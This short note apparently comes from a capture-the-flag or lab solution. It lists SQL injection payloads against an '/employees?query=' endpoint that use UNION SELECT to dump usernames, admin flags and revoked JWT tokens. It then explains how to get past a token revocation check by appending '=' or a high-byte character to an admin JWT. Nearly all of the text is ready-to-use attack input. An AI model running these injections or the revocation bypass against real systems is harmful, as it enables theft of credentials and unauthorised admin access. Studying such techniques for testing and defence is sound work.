endpoint: `/employees?query=`

`x' union select 1,2,3,4 -- `
`x' union select 1,group_concat(username),3,group_concat(is_admin) from users -- `
`x' union select 1,group_concat(id),3,group_concat(token) from revoked_tokens -- `

add an additional `=` or any character from `chr(128)` to `chr(255)` after the admin JWT token to bypass the token
revocation check.